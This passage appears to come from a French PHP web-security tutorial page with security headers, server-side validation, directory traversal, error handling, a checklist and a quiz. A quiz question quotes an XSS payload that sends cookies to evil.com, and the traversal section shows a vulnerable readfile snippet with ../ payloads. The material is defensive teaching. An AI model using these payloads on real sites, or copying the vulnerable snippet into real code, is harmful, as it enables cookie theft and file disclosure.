+<span class="fn">header_remove</span>(<span class="str">'X-Powered-By'</span>);</code></pre></div><div class="table-wrap"><table><thead><tr><th>En-tete</th><th>Protege contre</th></tr></thead><tbody><tr><td>X-Frame-Options: DENY</td><td>Clickjacking : inclusion de votre page dans une iframe malveillante</td></tr><tr><td>X-Content-Type-Options: nosniff</td><td>MIME sniffing : le navigateur ne reinterprete pas le type du fichier</td></tr><tr><td>Strict-Transport-Security</td><td>Downgrade HTTPS vers HTTP : force le navigateur a toujours utiliser HTTPS</td></tr><tr><td>Content-Security-Policy</td><td>XSS : definit quelles sources de scripts/styles sont autorisees</td></tr><tr><td>Referrer-Policy</td><td>Fuite d'URL : controle les infos envoyees dans le header Referer</td></tr><tr><td>X-Powered-By (supprimer)</td><td>Fingerprinting : n'expose pas la version de PHP aux attaquants</td></tr></tbody></table></div><div class="callout tip"><span class="ci">!</span><div><strong>CSP est la protection XSS la plus puissante.</strong> Avec une politique <code>script-src 'self'</code>, le navigateur refuse d'executer tout script qui ne vient pas de votre domaine, meme si une XSS a reussi a injecter une balise <code>&lt;script src="evil.com/..."&gt;</code>.</div></div></section><div class="divider"></div>
+<section class="etape" id="e5"><div class="etape-header"><div class="etape-num">05</div><div><div class="etape-tag">Defense</div><h2>Validation serveur</h2></div></div><p class="prose">La validation cote client (HTML5, JavaScript) peut etre contournee. La validation cote serveur est obligatoire et doit etre la seule source de verite.</p><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name">Validation serveur &mdash; fonctions PHP natives</span><span class="cb-badge good">PHP</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// Fonctions de validation PHP natives</span>
+
+<span class="cmt">// Email</span>
+<span class="fn">filter_var</span>(<span class="vr">$email</span>, <span class="fn">FILTER_VALIDATE_EMAIL</span>);
+
+<span class="cmt">// URL</span>
+<span class="fn">filter_var</span>(<span class="vr">$url</span>, <span class="fn">FILTER_VALIDATE_URL</span>);
+
+<span class="cmt">// Entier dans une plage</span>
+<span class="fn">filter_var</span>(<span class="vr">$age</span>, <span class="fn">FILTER_VALIDATE_INT</span>, [<span class="str">'options'</span> => [<span class="str">'min_range'</span> => <span class="num">0</span>, <span class="str">'max_range'</span> => <span class="num">120</span>]]);
+
+<span class="cmt">// Float</span>
+<span class="fn">filter_var</span>(<span class="vr">$prix</span>, <span class="fn">FILTER_VALIDATE_FLOAT</span>);
+
+<span class="cmt">// IP</span>
+<span class="fn">filter_var</span>(<span class="vr">$ip</span>, <span class="fn">FILTER_VALIDATE_IP</span>, <span class="fn">FILTER_FLAG_IPV4</span>);
+
+<span class="cmt">// Nettoyer une entree (supprimer balises HTML)</span>
+<span class="fn">filter_var</span>(<span class="vr">$input</span>, <span class="fn">FILTER_SANITIZE_SPECIAL_CHARS</span>);
+
+<span class="cmt">// Validation manuelle &mdash; classe Validator maison</span>
+<span class="kw">function</span> <span class="fn">validateProduit</span>(array <span class="vr">$data</span>): array {
+    <span class="vr">$errors</span> = [];
+    <span class="kw">if</span> (<span class="fn">empty</span>(<span class="fn">trim</span>(<span class="vr">$data</span>[<span class="str">'nom'</span>] ?? <span class="str">''</span>)))                          <span class="vr">$errors</span>[<span class="str">'nom'</span>]   = <span class="str">'Requis'</span>;
+    <span class="kw">if</span> (<span class="fn">strlen</span>(<span class="vr">$data</span>[<span class="str">'nom'</span>] ?? <span class="str">''</span>) > <span class="num">200</span>)                            <span class="vr">$errors</span>[<span class="str">'nom'</span>]   = <span class="str">'Max 200 caracteres'</span>;
+    <span class="kw">if</span> (!<span class="fn">filter_var</span>(<span class="vr">$data</span>[<span class="str">'prix'</span>] ?? <span class="str">''</span>, <span class="fn">FILTER_VALIDATE_FLOAT</span>))    <span class="vr">$errors</span>[<span class="str">'prix'</span>]  = <span class="str">'Nombre invalide'</span>;
+    <span class="kw">if</span> ((<span class="vr">$data</span>[<span class="str">'prix'</span>] ?? <span class="num">-1</span>) < <span class="num">0</span>)                                   <span class="vr">$errors</span>[<span class="str">'prix'</span>]  = <span class="str">'Prix negatif interdit'</span>;
+    <span class="kw">if</span> (!<span class="fn">filter_var</span>(<span class="vr">$data</span>[<span class="str">'stock'</span>] ?? <span class="str">''</span>, <span class="fn">FILTER_VALIDATE_INT</span>))    <span class="vr">$errors</span>[<span class="str">'stock'</span>] = <span class="str">'Entier requis'</span>;
+    <span class="kw">return</span> <span class="vr">$errors</span>;
+}</code></pre></div><div class="callout warn"><span class="ci">!</span><div><strong>La validation HTML5 et JavaScript est cosmétique.</strong> Un attaquant utilise curl, Postman ou les DevTools pour envoyer des requetes sans passer par votre formulaire. La validation serveur en PHP est la seule contrainte reelle.</div></div></section><div class="divider"></div>
+<section class="etape" id="e6"><div class="etape-header"><div class="etape-num">06</div><div><div class="etape-tag">Attaque 4</div><h2>Directory traversal</h2></div></div><p class="prose">Le directory traversal exploite les sequences <code>../</code> dans un nom de fichier pour acceder a des fichiers hors du dossier prevu. Il peut exposer des fichiers de configuration, des mots de passe, etc.</p><div class="compare-2"><div class="compare-box bad"><h4>✗ Nom de fichier non verifie</h4><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name"></span><span class="cb-badge bad">Vulnérable</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// URL : /download?file=../../config/database.php</span>
+<span class="cmt">// Expose le fichier de config avec les mots de passe !</span>
+
+<span class="vr">$fichier</span> = <span class="str">'uploads/'</span> . <span class="vr">$_GET</span>[<span class="str">'file'</span>];
+<span class="danger">readfile</span>(<span class="vr">$fichier</span>);  <span class="danger">// DANGEREUX</span></code></pre></div></div><div class="compare-box good"><h4>✓ Validation avec realpath()</h4><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name"></span><span class="cb-badge good">Securise</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="vr">$dossierBase</span> = <span class="fn">realpath</span>(<span class="fn">__DIR__</span> . <span class="str">'/uploads'</span>);
+<span class="vr">$chemin</span>      = <span class="fn">realpath</span>(<span class="vr">$dossierBase</span> . <span class="str">'/'</span> . <span class="vr">$_GET</span>[<span class="str">'file'</span>]);
+
+<span class="cmt">// Verifier que le chemin resolu est bien dans uploads/</span>
+<span class="kw">if</span> (<span class="vr">$chemin</span> === <span class="kw">false</span> || !<span class="fn">str_starts_with</span>(<span class="vr">$chemin</span>, <span class="vr">$dossierBase</span>)) {
+    <span class="fn">http_response_code</span>(<span class="num">403</span>); <span class="kw">exit</span>;
+}
+<span class="safe">readfile</span>(<span class="vr">$chemin</span>);  <span class="safe">// SECURISE</span></code></pre></div></div></div><div class="callout info"><span class="ci">i</span><div><strong>realpath() resout les sequences ../ et les liens symboliques.</strong> <code>realpath('/var/www/uploads/../../../etc/passwd')</code> renvoie <code>'/etc/passwd'</code>. En verifiant que le resultat commence bien par le dossier de base avec <code>str_starts_with()</code>, on garantit que le fichier est dans le bon dossier.</div></div></section><div class="divider"></div>
+<section class="etape" id="e7"><div class="etape-header"><div class="etape-num">07</div><div><div class="etape-tag">Defense</div><h2>Exposition de donnees et erreurs</h2></div></div><p class="prose">En production, les messages d'erreur PHP detailles exposent des informations precieuses aux attaquants : chemins de fichiers, noms de tables, version PHP, mots de passe dans les DSN.</p><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name">Configuration PHP &mdash; production vs developpement</span><span class="cb-badge good">PHP</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// En developpement : afficher toutes les erreurs</span>
+<span class="kw">if</span> (<span class="fn">getenv</span>(<span class="str">'APP_ENV'</span>) === <span class="str">'development'</span>) {
+    <span class="fn">ini_set</span>(<span class="str">'display_errors'</span>,         <span class="str">'1'</span>);
+    <span class="fn">ini_set</span>(<span class="str">'display_startup_errors'</span>,  <span class="str">'1'</span>);
+    <span class="fn">error_reporting</span>(<span class="fn">E_ALL</span>);
+
+<span class="cmt">// En production : logguer sans afficher</span>
+} <span class="kw">else</span> {
+    <span class="fn">ini_set</span>(<span class="str">'display_errors'</span>,   <span class="str">'0'</span>);
+    <span class="fn">ini_set</span>(<span class="str">'log_errors'</span>,       <span class="str">'1'</span>);
+    <span class="fn">ini_set</span>(<span class="str">'error_log'</span>,        <span class="str">'/var/log/php/app_errors.log'</span>);
+    <span class="fn">error_reporting</span>(<span class="fn">E_ALL</span>);
+}
+
+<span class="cmt">// Gestionnaire d'erreurs global</span>
+<span class="fn">set_exception_handler</span>(<span class="kw">function</span>(<span class="cls">Throwable</span> <span class="vr">$e</span>): void {
+    <span class="fn">error_log</span>(<span class="vr">$e</span>-><span class="fn">getMessage</span>() . <span class="str">' in '</span> . <span class="vr">$e</span>-><span class="fn">getFile</span>() . <span class="str">':'</span> . <span class="vr">$e</span>-><span class="fn">getLine</span>());
+
+    <span class="kw">if</span> (<span class="fn">getenv</span>(<span class="str">'APP_ENV'</span>) !== <span class="str">'development'</span>) {
+        <span class="fn">http_response_code</span>(<span class="num">500</span>);
+        <span class="kw">echo</span> <span class="str">'Une erreur est survenue. Veuillez reessayer.'</span>;
+        <span class="kw">exit</span>;
+    }
+    <span class="cmt">// En dev : lancer une exception pour voir la stacktrace</span>
+    <span class="kw">throw</span> <span class="vr">$e</span>;
+});</code></pre></div><div class="callout warn"><span class="ci">!</span><div><strong>Les messages d'erreur SQL sont une mine d'or pour un attaquant.</strong> Un message comme "Table 'boutique.users' doesn't exist" revele le nom de la BDD, le nom de la table, et confirme une injection. En production, logger l'erreur et afficher uniquement un message generique.</div></div></section><div class="divider"></div>
+<section class="etape" id="e8"><div class="etape-header"><div class="etape-num">08</div><div><div class="etape-tag">Synthese</div><h2>Checklist de securite complete</h2></div></div><p class="prose">Checklist de securite a verifier avant chaque mise en production.</p><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name">Checklist securite PHP &mdash; reference complete</span><span class="cb-badge good">PHP</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="cmt">/* ====== SORTIES ====== */</span>
+<span class="cmt">// [ ] htmlspecialchars() sur toute variable affichee dans le HTML</span>
+<span class="cmt">// [ ] ENT_QUOTES pour les attributs HTML</span>
+<span class="cmt">// [ ] Valider les URLs (https?:// seulement)</span>
+
+<span class="cmt">/* ====== BASE DE DONNEES ====== */</span>
+<span class="cmt">// [ ] Requetes preparees PDO sur TOUTES les valeurs externes</span>
+<span class="cmt">// [ ] Whitelist pour ORDER BY et noms de colonnes</span>
+<span class="cmt">// [ ] ATTR_EMULATE_PREPARES = false</span>
+
+<span class="cmt">/* ====== AUTHENTIFICATION ====== */</span>
+<span class="cmt">// [ ] password_hash(PASSWORD_BCRYPT) pour les mots de passe</span>
+<span class="cmt">// [ ] session_regenerate_id(true) apres connexion</span>
+<span class="cmt">// [ ] Token CSRF sur tous les formulaires POST</span>
+<span class="cmt">// [ ] hash_equals() pour comparer les tokens</span>
+
+<span class="cmt">/* ====== UPLOAD ====== */</span>
+<span class="cmt">// [ ] Verifier le MIME avec finfo (pas $_FILES[type])</span>
+<span class="cmt">// [ ] Renommer le fichier (nom aleatoire bin2hex)</span>
+<span class="cmt">// [ ] Stocker hors de la racine web OU .htaccess php_flag engine off</span>
+
+<span class="cmt">/* ====== FICHIERS ====== */</span>
+<span class="cmt">// [ ] realpath() + str_starts_with() pour les inclusions de fichiers</span>
+
+<span class="cmt">/* ====== EN-TETES HTTP ====== */</span>
+<span class="cmt">// [ ] X-Frame-Options: DENY</span>
+<span class="cmt">// [ ] X-Content-Type-Options: nosniff</span>
+<span class="cmt">// [ ] Strict-Transport-Security (HTTPS)</span>
+<span class="cmt">// [ ] Content-Security-Policy</span>
+<span class="cmt">// [ ] header_remove(X-Powered-By)</span>
+
+<span class="cmt">/* ====== CONFIGURATION ====== */</span>
+<span class="cmt">// [ ] display_errors = 0 en production</span>
+<span class="cmt">// [ ] error_log actif</span>
+<span class="cmt">// [ ] .env non accessible depuis le web</span>
+<span class="cmt">// [ ] vendor/ non accessible depuis le web</span>
+<span class="cmt">// [ ] Permissions fichiers restrictives (644 / 755)</span></code></pre></div><div class="checkpoint"><span class="cp-icon">OK</span><div class="cp-text"><strong>Principe de defense en profondeur.</strong> Chaque couche protege contre une attaque differente. Une XSS peut passer les CSP si les headers manquent. Une injection SQL peut passer si les requetes preparees ne sont pas utilisees. Toutes les mesures doivent etre appliquees ensemble.</div></div></section><div class="divider"></div>
+<section class="etape" id="quiz"><div class="etape-header"><div class="etape-num">09</div><div><div class="etape-tag">Evaluation</div><h2>Quiz &mdash; securite web</h2></div></div><div class="quiz-card"><div class="q"><span class="qn">Q1.</span> Un attaquant entre comme nom de produit : <code>&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code>. Quelle fonction protege contre ca ?</div><div class="opts"><button class="opt" onclick="ans(this,'q1',false)">strip_tags() &mdash; supprime toutes les balises HTML</button><button class="opt" onclick="ans(this,'q1',true)">htmlspecialchars($var, ENT_QUOTES, 'UTF-8') &mdash; transforme < > en entites HTML inoffensives. Le script s'affiche en texte brut et ne s'execute pas.</button><button class="opt" onclick="ans(this,'q1',false)">addslashes() &mdash; echappe les guillemets</button></div><div class="fb" id="fb-q1"></div></div><div class="quiz-card"><div class="q"><span class="qn">Q2.</span> Pourquoi ne pas faire confiance a $_FILES['type'] pour valider le type d'un fichier uploade ?</div><div class="opts"><button class="opt" onclick="ans(this,'q2',false)">La variable $_FILES n'existe pas dans les nouvelles versions de PHP</button><button class="opt" onclick="ans(this,'q2',true)">$_FILES['type'] est fourni par le navigateur du client et peut etre falsifie. Il faut utiliser finfo qui lit les magic bytes du fichier lui-meme, une valeur que l'attaquant ne peut pas forger.</button><button class="opt" onclick="ans(this,'q2',false)">$_FILES['type'] ne contient que l'extension, pas le vrai type</button></div><div class="fb" id="fb-q2"></div></div><div class="quiz-card"><div class="q"><span class="qn">Q3.</span> Quelle est la contre-mesure principale contre le directory traversal (/download?file=../../etc/passwd) ?</div><div class="opts"><button class="opt" onclick="ans(this,'q3',false)">Bloquer les requetes contenant ../ dans le WAF</button><button class="opt" onclick="ans(this,'q3',true)">realpath() resout le chemin final en eliminant les ../. On verifie ensuite avec str_starts_with() que le chemin resolu est bien dans le dossier autorise.</button><button class="opt" onclick="ans(this,'q3',false)">Utiliser str_replace pour enlever ../ du nom de fichier</button></div><div class="fb" id="fb-q3"></div></div><div class="quiz-card"><div class="q"><span class="qn">Q4.</span> Quel en-tete HTTP empeche l'inclusion de votre page dans une iframe (clickjacking) ?</div><div class="opts"><button class="opt" onclick="ans(this,'q4',false)">Content-Security-Policy: no-iframe</button><button class="opt" onclick="ans(this,'q4',true)">X-Frame-Options: DENY &mdash; instruits le navigateur de refuser d'afficher la page dans une frame, iframe ou object. L'attaquant ne peut pas superposer une iframe transparente sur votre site.</button><button class="opt" onclick="ans(this,'q4',false)">X-Content-Type-Options: nosniff</button></div><div class="fb" id="fb-q4"></div></div><div class="quiz-card"><div class="q"><span class="qn">Q5.</span> Pourquoi display_errors doit etre a 0 en production ?</div><div class="opts"><button class="opt" onclick="ans(this,'q5',false)">Pour ameliorer les performances du serveur PHP</button><button class="opt" onclick="ans(this,'q5',true)">Les messages d'erreur detailles exposent des chemins de fichiers, noms de tables, versions de librairies. Un attaquant utilise ces infos pour cibler ses attaques. On logue les erreurs sans les afficher.</button><button class="opt" onclick="ans(this,'q5',false)">PHP exige cette configuration en mode production</button></div><div class="fb" id="fb-q5"></div></div><div id="score-box" style="display:none;padding:24px;background:var(--card);border:1px solid var(--border);border-radius:12px;margin-top:12px;text-align:center;"><div id="s-score" style="font-family:var(--mono);font-size:2.5rem;font-weight:900;color:var(--accent);line-height:1;margin-bottom:8px;"></div><div id="s-text" style="font-family:var(--mono);font-size:.88rem;color:var(--muted);"></div></div></section></main></div>
+<script>
+const secs=document.querySelectorAll('.etape[id]'),nl=document.querySelectorAll('.nav-link');
+secs.forEach(s=>new IntersectionObserver(e=>{e.forEach(x=>{if(x.isIntersecting){nl.forEach(l=>l.classList.remove('active'));const l=document.querySelector('.nav-link[href="#'+x.target.id+'"]');if(l)l.classList.add('active');}});},{threshold:.2}).observe(s));
+function cp(btn){const pre=btn.closest('.code-block').querySelector('pre');navigator.clipboard.writeText(pre.innerText).then(()=>{btn.textContent='Copie';btn.classList.add('ok');setTimeout(()=>{btn.textContent='copier';btn.classList.remove('ok');},1800);});}
+const fbs={
+  q1:{ok:'Exact. htmlspecialchars() convertit &lt; en entite HTML. Le script devient du texte visible, pas execute. ENT_QUOTES echappe aussi les guillemets, important pour les attributs HTML.',ko:'Non. htmlspecialchars(ENT_QUOTES) est la protection XSS. strip_tags() peut etre contourne. addslashes() ne protege pas les balises. htmlspecialchars() est la seule methode fiable pour les sorties HTML.'},
+  q2:{ok:'Exact. $_FILES[type] vient du client et peut etre falsifie. finfo (ou mime_content_type) lit les magic bytes du fichier lui-meme, ce que l attaquant ne peut pas falsifier.',ko:'Non. $_FILES[type] vient du client et peut etre falsifie. Il faut utiliser finfo qui examine les octets reels du fichier. C est la seule facon de connaitre le vrai type MIME.'},
+  q3:{ok:'Exact. realpath() resout le chemin final en eliminant les ../. str_starts_with() verifie que le chemin resolu est bien dans le dossier autorise. str_replace est contournable avec ....//.',ko:'Non. realpath() est la bonne solution. Il resout le chemin complet. str_starts_with() verifie ensuite que le chemin est dans le dossier autorise. str_replace est contournable.'},
+  q4:{ok:'Exact. X-Frame-Options: DENY empeche tout site tiers d inclure votre page dans une iframe. Le clickjacking superpose une iframe transparente sur votre site pour tromper l utilisateur. CSP avec frame-ancestors none est l equivalent moderne.',ko:'Non. X-Frame-Options: DENY protege contre le clickjacking. X-Content-Type-Options: nosniff empeche le MIME sniffing. Ce sont deux protections differentes.'},
+  q5:{ok:'Exact. Les messages d erreur detailles exposent des chemins de fichiers, noms de tables, version PHP. Un attaquant utilise ces infos pour cibler ses attaques. On log les erreurs pour le developpeur sans les exposer au public.',ko:'Non. display_errors = 0 empeche les attaquants de lire les messages d erreur detailles. Ces infos aident a cibler les attaques. On log les erreurs sans les afficher au visiteur.'}
+};
+const rep={};
+function ans(btn,qid,ok){
+  if(rep[qid]!==undefined)return;rep[qid]=ok;
+  btn.closest('.quiz-card').querySelectorAll('.opt').forEach(o=>o.disabled=true);
+  btn.classList.add(ok?'correct':'wrong');
+  if(!ok)btn.closest('.quiz-card').querySelectorAll('.opt').forEach(o=>{if(o.onclick&&o.onclick.toString().includes(',true)'))o.classList.add('correct');});
+  const fb=document.getElementById('fb-'+qid);fb.innerHTML=fbs[qid][ok?'ok':'ko'];fb.className='fb show '+(ok?'ok':'ko');
+  if(Object.keys(rep).length===5){const g=Object.values(rep).filter(Boolean).length,box=document.getElementById('score-box');box.style.display='block';document.getElementById('s-score').textContent=g+'/5';document.getElementById('s-text').innerHTML=g===5?'Parfait &mdash; securite maitrisee !':g>=4?'Tres bien.':g>=3?'Revoir XSS et l upload.':'Reprendre depuis le tableau des menaces.';box.scrollIntoView({behavior:'smooth',block:'center'});}
+}
+</script></body></html>
